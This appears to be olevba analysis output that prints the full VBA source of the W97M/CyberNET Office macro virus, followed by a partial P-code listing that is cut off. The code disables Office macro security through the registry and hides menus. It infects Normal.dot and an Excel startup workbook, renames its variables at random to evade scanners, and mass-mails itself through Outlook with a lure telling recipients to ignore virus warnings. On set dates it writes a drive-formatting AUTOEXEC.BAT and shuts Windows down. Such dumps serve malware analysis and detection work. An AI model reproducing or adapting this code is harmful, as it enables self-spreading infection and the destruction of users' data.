olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSOffice.Cybernet
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSOffice.Cybernet - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Close()
On Error Resume Next
'W97M/CyberNET (C)2000 - Indonesia By AnomOke! "I'm NOT Responsible For Any Damage That Posible Cause By My Virus...!!!"
Application.EnableCancelKey = wdCancelDisabled: Options.SaveInterval = 1: Options.ConfirmConversions = False: Options.SaveNormalPrompt = False: Application.DisplayRecentFiles = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else: Options.VirusProtection _
= False: System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = &H0: End If
Call GP1055
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
Randomize: For QF7352 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next QF7352
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: Call HG3579: End If
MB7293 = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
HT202 = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
If ActiveDocument.VBProject.Description <> "CyberNET" Or Left(ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set RN8755 = ActiveDocument.VBProject.VBComponents
Call KP6522(RN8755)
RN8755(1).CodeModule. _
AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, HT202 - 19))
ActiveDocument.VBProject.Description = "CyberNET"
End If
If NormalTemplate.VBProject.Description <> "CyberNET" Or Left(NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Then
Set RN8755 = NormalTemplate.VBProject.VBComponents
Call KP6522(RN8755)
Randomize
Dim FB4323(1 To 37) As String
FB4323(1) = "PG353"
FB4323(2) = "PV8948"
FB4323(3) = "MO4724"
FB4323(4) = "BE1547"
FB4323(5) = "QC586"
FB4323(6) = "MB7293"
FB4323(7) = "HT202"
FB4323(8) = "RN8755"
FB4323(9) = "SV6656"
FB4323(10) = "SA6469"
FB4323(11) = "MT3412"
FB4323(12) = "UA3493"
FB4323(13) = "GP1055"
FB4323(14) = "VJ455"
FB4323(15) = "QA8567"
FB4323(16) = "VN95"
FB4323(17) = "TE9976"
FB4323(18) = "PB5760"
FB4323(19) = "OU945"
FB4323(20) = "TS8760"
FB4323(21) = "KP6522"
FB4323(22) = "AV1314"
FB4323(23) = "JJ789"
FB4323(24) = "QF7352"
FB4323(25) = "FP6716"
FB4323(26) = "EJ8475"
FB4323(27) = "HN937"
FB4323(28) = "ST911"
FB4323(29) = "OU8710"
FB4323(30) = "PV1223"
FB4323(31) = "UR5071"
FB4323(32) = "UR9551"
FB4323(33) = "HG3579"
FB4323(34) = "GI6166"
FB4323(35) = "VO9720"
FB4323(36) = "QJ6170"
FB4323(37) = _
"FB4323"
For UA3493 = 1 To 37
SV6656 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call QC586(SV6656, FB4323(UA3493))
Next UA3493
ActiveDocument.Saved = True
RN8755(1).CodeModule. _
AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, MB7293 - 1) & _
vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & _
"If Dialogs(80).Show <> 0 Then Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub")
RN8755(1).Name = "HN937"
NormalTemplate.VBProject.Description = "CyberNET"
End If
Set ST911 = CreateObject("Excel.Application")
If UCase(Dir(ST911.Application.StartupPath + "\CyberNET.xls")) <> UCase("CYBERNET.XLS") Or Day(Now) = Minute(Now) Then
If UCase(Dir(ST911.Application.StartupPath + "\CyberNET.xls")) = UCase("CYBERNET.XLS") Then _
SetAttr (ST911.Application.StartupPath + "\CyberNET.xls"), vbArchive
If Dir(ST911.Application.StartupPath + "\*.xl?") <> "" Then _
Kill (ST911.Application.StartupPath + "\*.xl?")
Set OU8710 = ST911.Workbooks.Add
OU8710.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines - 18)
OU8710.VBProject.VBComponents("ThisWorkbook").CodeModule.ReplaceLine 151, "Attachments.Add ActiveWorkbook.FullName"
OU8710.SaveAs ST911.Application.StartupPath & "\CyberNET.xls"
ST911.ActiveWorkbook.VBProject.Description = "CyberNET"
ST911.ActiveWindow.Visible = False
ST911.Workbooks("CyberNET.xls").Save
ST911.Quit
SetAttr (ST911.Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
If HT202 <> 0 And MB7293 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub
Private Function QC586(MT3412, SA6469 As String)
On Error Resume Next
Dim PG353 As Long: Dim PV8948 As Long: Dim MO4724 As Long: Dim BE1547 As Long
With ActiveDocument.VBProject.VBComponents(1).CodeModule
PG353 = 1: PV8948 = 1: MO4724 = .CountOfLines: BE1547 = Len(.Lines(.CountOfLines, 1))
Do While .Find(SA6469, PG353, PV8948, MO4724, BE1547, True)
QJ6170 = .Lines(PG353, 1)
QJ6170 = _
Left(QJ6170, PV8948 - 1) & MT3412 & _
Mid(QJ6170, BE1547)
.ReplaceLine PG353, QJ6170
PG353 = MO4724 + 1: PV8948 = 1
MO4724 = .CountOfLines
BE1547 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
Private Function KP6522(RN8755)
Dim AV1314 As Object
For Each AV1314 In RN8755
AV1314.CodeModule.DeleteLines 1, _
AV1314.CodeModule.CountOfLines
Next AV1314
End Function
Private Function GP1055()
On Error Resume Next
Dim VN95, TE9976, PB5760
Set VN95 = CreateObject("Outlook.Application")
Set TE9976 = VN95.GetNameSpace("MAPI")
If GetSetting("Office", "CyberNET", "CyberNET") <> "(C)2000 - Indonesia By AnomOke!" Then
If VN95 = "Outlook" Then
TE9976.Logon "profile", "password"
For VJ455 = 1 To TE9976.AddressLists. _
Count 'anti-heuristic for stupid Norton antivirus scanner
Set EJ8475 = TE9976.AddressLists(VJ455)
JJ789 = 1
Set PB5760 = VN95.CreateItem(0)
For QA8567 = 1 To EJ8475.AddressEntries.Count
FP6716 = EJ8475.AddressEntries(JJ789)
PB5760.Recipients.Add FP6716
JJ789 = _
JJ789 + 1
If JJ789 > 50 Then QA8567 = EJ8475.AddressEntries.Count
Next QA8567
PB5760.Subject = "You've GOT Mail !!!"
PB5760.Body = "Please, saved the document after you read and don't show to anyone else. The document is also VIRUS FREE...so DISREGARD the virus protection warning !!!"
PB5760. _
Attachments.Add ActiveWorkbook.FullName
PB5760. _
Send 'anti-heuristic for stupid McAfee antivirus scanner
FP6716 = ""
Next VJ455
TE9976.Logoff
End If
SaveSetting "Office", "CyberNET", "CyberNET", "(C)2000 - Indonesia By AnomOke!"
End If
End Function
Private Sub Workbook_Deactivate()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
If Day(Now) = 17 And Month(Now) = 8 Or Day(Now) = 25 And Month(Now) = 12 Then
For VO9720 = 1 To 30
GI6166 = (Chr(65 + Int(Rnd * 12))) & VO9720
Range(GI6166).AddComment
Range(GI6166).Comment.Visible = True
Range(GI6166).Comment.Text Text:="(C)2000 - CyberNET From Indonesia"
Range(GI6166).Comment.Shape.Select True
Selection.ShapeRange.IncrementLeft Int(Rnd * 300)
Selection.ShapeRange.IncrementTop Int(Rnd * 300): Next VO9720
ActiveWorkbook.SaveAs FileName:=ActiveWorkbook.FullName: Call HG3579: End If
Set PV1223 = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Or Day(Now) = Minute(Now) Then
Set UR5071 = GetObject(, "Word.Application")
If UR5071 = "" Then
Set UR5071 = CreateObject("Word.Application")
UR9551 = True
End If
If Dir(Application.TemplatesPath + "\Normal.dot") <> "" Then Kill (Application.TemplatesPath + "\Normal.dot")
If Dir(UR5071.Application.StartupPath + "\*.do?") <> "" Then _
Kill (UR5071.Application.StartupPath + "\*.do?")
Set RN8755 = UR5071.NormalTemplate.VBProject.VBComponents
UR5071.Options.SaveNormalPrompt = False
RN8755(1).CodeModule.InsertLines 1, "Public Sub HN937()" & vbCr & PV1223.Lines(5, 4) & vbCr & "End Sub"
UR5071.Run "Normal.ThisDocument.HN937"
Call KP6522(RN8755)
RN8755(1).CodeModule.InsertLines 1, PV1223. _
Lines(1, PV1223.CountOfLines - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "CommandBars(" & Chr(34) & "Tools" & Chr(34) & ").Controls(" & Chr(34) & "Macro" & Chr(34) & ").Enabled = False" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" _
& vbCr & "Call ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub FileOpen()" & vbCr & "WordBasic.DisableAutoMacros True" & vbCr & "On Error Resume Next" & vbCr & "If Dialogs(80).Show <> 0 Then Call Document_Close" _
& vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub" & vbCr & "Sub AutoExec()" & vbCr & _
"WordBasic.DisableAutoMacros True" & vbCr & "Call Document_Close" & vbCr & "WordBasic.DisableAutoMacros False" & vbCr & "End Sub"
UR5071.NormalTemplate.VBProject.Description = "CyberNET"
RN8755(1).Name = "HN937"
RN8755(1).CodeModule.ReplaceLine 151, "Attachments.Add ActiveDocument.FullName"
Set RN8755 = Nothing
If UR9551 = True Then UR5071.Quit
If UCase(Dir(Application.StartupPath + "\CyberNET.xls")) <> "CYBERNET.XLS" Then
Set ST911 = CreateObject("Excel.Application")
Set OU8710 = ST911.Workbooks.Add
OU8710.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, PV1223. _
Lines(1, PV1223.CountOfLines - 1)
OU8710.SaveAs FileName:=Application.StartupPath & "\CyberNET.xls", FileFormat:=xlNormal, AddToMru:=False
ST911.ActiveWorkbook.VBProject.Description = "CyberNET"
ST911.ActiveWindow.Visible = False
ST911.Workbooks("CyberNET.xls").Save
ST911.Quit
SetAttr (Application.StartupPath + "\CyberNET.xls"), vbReadOnly
End If
End If
If Left(ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(3, 14), 14) <> "'W97M/CyberNET" Or ActiveWorkbook.VBProject.Description <> "CyberNET" Then
Set RN8755 = ActiveWorkbook.VBProject.VBComponents
Call KP6522(RN8755)
ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.InsertLines 1, PV1223. _
Lines(1, PV1223.CountOfLines - 1)
ActiveWorkbook.VBProject.Description = "CyberNET"
End If
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.EnableCancelKey = xlDisabled
Application.CommandBars("Tools").Controls("Macro").Enabled = False
Application.CommandBars("Window").Controls("Unhide...").Enabled = False
If UCase(Dir("C:\CyberNET.reg")) <> "CYBERNET.REG" Then
If Application.Version <> "9.0" Then
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
Print #1, """Options6""=dword:00000000"
Close #1
Else
Open "C:\CyberNET.reg" For Output As #1
Print #1, "REGEDIT4"
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security]"
Print #1, """Level""=dword:00000001"
Close #1
End If
End If
Shell "Regedit.exe /S C:\CyberNET.reg", vbHide
Call GP1055
Application.OnSheetActivate = "ThisWorkbook.Workbook_Deactivate"
End Sub
Private Function HG3579()
On Error Resume Next
Open ("C:\AUTOEXEC.BAT") For Output As #1
Print #1, "@ECHO OFF"
Print #1, "ECHO ###############################################################################"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO #               Vine...Vide...Vice...Moslem Power Never End...                #"
Print #1, "ECHO # I'm Really Sorry, This System Have Been Recycled By -= CyberNET =- Virus!!! #"
Print #1, "ECHO #                     Brought To You From INDONESIA...                        #"
Print #1, "ECHO #                                                                             #"
Print #1, "ECHO ###############################################################################"
Print #1, "CTTY NUL"
Print #1, "FORMAT C: /AUTOTEST /Q /U"
Close #1
Open ("C:\CONFIG.SYS") For Output As #2
Print #2, "SWITCHES=/N"
Print #2, "BREAK=OFF"
Close #2
MsgBox "Assalamualaikum Li Kulli Muslim...Moslem Power Never End..." & Chr(13) & "Nothing Can Stop << CyberNET >> Virus. Your System Has Already Infected !!!" & vbCr & "Now...I Am Outta Here...", vbCritical + vbOKOnly, "(C)2000 - CyberNET"
Shell ("RUNDLL.EXE user.exe,exitwindows"), vbHide
End Function







-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: ./Virus.MSOffice.Cybernet - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: ./Virus.MSOffice.Cybernet - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: ./Virus.MSOffice.Cybernet - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSOffice.Cybernet
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 21456 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Close())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	QuoteRem 0x0000 0x0077 "W97M/CyberNET (C)2000 - Indonesia By AnomOke! "I'm NOT Responsible For Any Damage That Posible Cause By My Virus...!!!""
' Line #4:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld Options 
' 	MemSt SaveInterval 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #6:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' 	BoS 0x0000 
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #7:
' 	LineCont 0x0004 05 00 00 00
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitHI2 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x0045 "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"
' 	LitStr 0x0008 "Options6"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #8:
' 	ArgsCall (Call) GP1055 0x0000 
' Line #9:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0011 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	And 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0019 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	And 
' 	Or 
' 	IfBlock 
' Line #10:
' 	ArgsCall Read 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld QF7352 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0046 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	For 
' Line #11:
' 	Ld Rnd 
' 	LitDI2 0x0078 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00C8 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x01F4 
' 	Mul 
' 	FnInt 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #12:
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	Ld Rnd 
' 	LitDI2 0x00FF 
' 	Mul 
' 	FnInt 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #13:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #14:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld QF7352 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	BoS 0x0000 
' 	ArgsCall (Call) HG3579 0x0000 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #16:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St MB7293 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St HT202 
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd Description 
' 	LitStr 0x0008 "CyberNET"
' 	Ne 
' 	LitDI2 0x0003 
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000E 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000E "'W97M/CyberNET"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set RN8755 
' Line #20:
' 	Ld RN8755 
' 	ArgsCall (Call) KP6522 0x0001 
' Line #21:
' 	LineCont 0x0004 07 00 00 00
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld HT202 
' 	LitDI2 0x0013 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	LitDI2 0x0001 
' 	ArgsLd RN8755 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #22:
' 	LitStr 0x0008 "CyberNET"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemSt Description 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd Description 
' 	LitStr 0x0008 "CyberNET"
' 	Ne 
' 	LitDI2 0x0003 
' 	LitDI2 0x000E 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x000E 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000E "'W97M/CyberNET"
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #25:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set RN8755 
' Line #26:
' 	Ld RN8755 
' 	ArgsCall (Call) KP6522 0x0001 
' Line #27:
' 	ArgsCall Read 0x0000 
' Line #28:
' 	Dim 
' 	LitDI2 0x0001 
' 	LitDI2 0x0025 
' 	VarDefn FB4323 (As String)
' Line #29:
' 	LitStr 0x0005 "PG353"
' 	LitDI2 0x0001 
' 	ArgsSt FB4323 0x0001 
' Line #30:
' 	LitStr 0x0006 "PV8948"
' 	LitDI2 0x0002 
' 	ArgsSt FB4323 0x0001 
' Line #31:
' 	LitStr 0x0006 "MO4724"
' 	LitDI2 0x0003 
' 	ArgsSt FB4323 0x0001 
' Line #32:
' 	LitStr 0x0006 "BE1547"
' 	LitDI2 0x0004 
' 	ArgsSt FB4323 0x0001 
' Line #33:
' 	LitStr 0x0005 "QC586"
' 	LitDI2 0x0005 
' 	ArgsSt FB4323 0x0001 
' Line #34:
' 	LitStr 0x0006 "MB7293"
' 	LitDI2 0x0006 
' 	ArgsSt FB4323 0x0001 
' Line #35:
' 	LitStr 0x0005 "HT202"
' 	LitDI2 0x0007 
' 	ArgsSt FB4323 0x0001 
' Line #36:
' 	LitStr 0x0006 "RN8755"
' 	LitDI2 0x0008 
' 	ArgsSt FB4323 0x0001 
' Line #37:
' 	LitStr 0x0006 "SV6656"
' 	LitDI2 0x0009 
' 	ArgsSt FB4323 0x0001 
' Line #38:
' 	LitStr 0x0006 "SA6469"
' 	LitDI2 0x000A 
' 	ArgsSt FB4323 0x0001 
' Line #39:
' 	LitStr 0x0006 "MT3412"
' 	LitDI2 0x000B 
' 	ArgsSt FB4323 0x0001 
' Line #40:
' 	LitStr 0x0006 "UA3493"
' 	LitDI2 0x000C 
' 	ArgsSt FB4323 0x0001 
' Line #41:
' 	LitStr 0x0006 "GP1055"
' 	LitDI2 0x000D 
' 	ArgsSt FB4323 0x0001 
' Line #42:
' 	LitStr 0x0005 "VJ455"
' 	LitDI2 0x000E 
' 	ArgsSt FB4323 0x0001 
' Line #43:
' 	LitStr 0x0006 "QA8567"
' 	LitDI2 0x000F 
' 	ArgsSt FB4323 0x0001 
' Line #44:
' 	LitStr 0x0004 "VN95"
' 	LitDI2 0x0010 
' 	ArgsSt FB4323 0x0001 
' Line #45:
' 	LitStr 0x0006 "TE9976"
' 	LitDI2 0x0011 
' 	ArgsSt FB4323 0x0001 
' Line #46:
' 	LitStr 0x0006 "PB5760"
' 	LitDI2 0x0012 
' 	ArgsSt FB4323 0x0001 
' Line #47:
' 	LitStr 0x0005 "OU945"
' 	LitDI2 0x0013 
' 	ArgsSt FB4323 0x0001 
' Line #48:
' 	LitStr 0x0006 "TS8760"
' 	LitDI2 0x0014 
' 	ArgsSt FB4323 0x0001 
' Line #49:
' 	LitStr 0x0006 "KP6522"
' 	LitDI2 0x0015 
' 	ArgsSt FB4323 0x0001 
' Line #50:
' 	LitStr 0x0006 "AV1314"
' 	LitDI2 0x0016 
' 	ArgsSt FB4323 0x0001 
' Line #51:
' 	LitStr 0x0005 "JJ789"
' 	LitDI2 0x0017 
' 	ArgsSt FB4323 0x0001 
' Line #52:
' 	LitStr 0x0006 "QF7352"
' 	LitDI2 0x0018 
' 	ArgsSt FB4323 0x0001 
' Line #53:
' 	LitStr 0x0006 "FP6716"
' 	LitDI2 0x0019 
' 	ArgsSt FB4323 0x0001 
' Line #54:
' 	LitStr 0x0006 "EJ8475"
' 	LitDI2 0x001A 
' 	ArgsSt FB4323 0x0001 
' Line #55:
' 	LitStr 0x0005 "HN937"
' 	LitDI2 0x001B 
' 	ArgsSt FB4323 0x0001 
' Line #56:
' 	LitStr 0x0005 "ST911"
' 	LitDI2 0x001C 
' 	ArgsSt FB4323 0x0001 
' Line #57:
' 	LitStr 0x0006 "OU8710"
' 	LitDI2 0x001D 
' 	ArgsSt FB4323 0x0001 
' Line #58:
' 	LitStr 0x0006 "PV1223"
' 	LitDI2 0x001E 
' 	ArgsSt FB4323 0x0001 
' Line #59:
' 	LitStr 0x0006 "UR5071"
' 	LitDI2 0x001F 
' 	ArgsSt FB4323 0x0001 
' Line #60:
' 	LitStr 0x0006 "UR9551"
' 	LitDI2 0x0020 
' 	ArgsSt FB4323 0x0001 
' Line #61:
' 	LitStr 0x0006 "HG3579"
' 	LitDI2 0x0021 
' 	ArgsSt FB4323 0x0001 
' Line #62:
' 	LitStr 0x0006 "GI6166"
' 	LitDI2 0x0022 
' 	ArgsSt FB4323 0x0001 
' Line #63:
' 	LitStr 0x0006 "VO9720"
' 	LitDI2 0x0023 
' 	ArgsSt FB4323 0x0001 
' Line #64:
' 	LitStr 0x0006 "QJ6170"
' 	LitDI2 0x0024 
' 	ArgsSt FB4323 0x0001 
' Line #65:
' 	LineCont 0x0004 05 00 00 00
' 	LitStr 0x0006 "FB4323"
' 	LitDI2 0x0025 
' 	ArgsSt FB4323 0x0001 
' Line #66:
' 	StartForVariable 
' 	Ld UA3493 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0025 
' 	For 
' Line #67:
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Paren 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St SV6656 
' Line #68:
' 	Ld SV6656 
' 	Ld UA3493 
' 	ArgsLd FB4323 0x0001 
' 	ArgsCall (Call) QC586 0x0002 
' Line #69:
' 	StartForVariable 
' 	Ld UA3493 
' 	EndForVariable 
' 	NextVar 
' Line #70:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' Line #71:
' 	LineCont 0x0014 07 00 00 00 21 00 00 00 4C 00 00 00 63 00 00 00 73 00 00 00
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
